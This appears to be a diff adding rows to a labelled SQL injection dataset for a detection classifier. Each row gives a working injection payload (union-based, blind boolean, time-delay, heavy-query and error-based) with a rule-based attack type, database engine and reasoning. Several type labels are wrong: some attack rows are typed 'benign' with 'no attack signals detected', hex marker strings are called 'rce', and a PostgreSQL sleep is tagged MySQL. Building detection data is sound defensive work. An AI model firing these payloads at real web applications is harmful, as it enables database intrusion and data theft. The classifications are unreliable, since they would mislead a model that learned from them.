@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+4140,"select * from generate_series ( 9863,9863,case when ( 9863 = 3285 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
+4141,"1'|| ( select 'yaii' from dual where 7317 = 7317 union all select null,null,null,null,null,null,null,null,null#",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
+4142,"1"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+4143,"-5591%"" ) ) order by 1--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4144,1' ) where 4949 = 4949,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4145,"1"" ) ) as sqow where 8752 = 8752",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4146,"1 ) where 8008 = 8008 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+4147,"1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,,rce,generic,0.95,0x4b774c75 detected — rce injection (priority 1) on generic,rule-based
+4148,"1"" ) as frmp where 6073 = 6073",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4149,"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
+4150,-2411 or ( 8459 = 8459 ) *4906# pxwg,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4151,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
+4152,"1%"" union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4153,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4154,select ( case when ( 3716 = 4021 ) then 3716 else 3716* ( select 3716 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4155,"-2111' union all select 1061,1061,1061--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4156,"1"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+4157,"-8060"" ) where 5290 = 5290 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,,boolean_blind,firebird,0.95,5290 = 5290 or detected — boolean_blind injection (priority 8) on firebird,rule-based
+4158,"-5170' ) ) as ovbf where 4833 = 4833 union all select 4833,4833,4833,4833--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4159,1' where 5103 = 5103,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4160,"-8771"" ) ) union all select 6302,6302,6302,6302,6302#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4161,"1, ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4162,"-1573"" ) union all select 3928,3928,3928,3928--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4163,1 ) rlike sleep ( 5 ) and ( 5724 = 5724,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4164,1 ) where 7096 = 7096,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4165,-3166'|| ( select 'mtan' from dual where 9420 = 9420 union all select 9420#,1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
+4166,1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 3069 = 3069,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+4167,1 where 4787 = 4787,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4168,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+4169,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
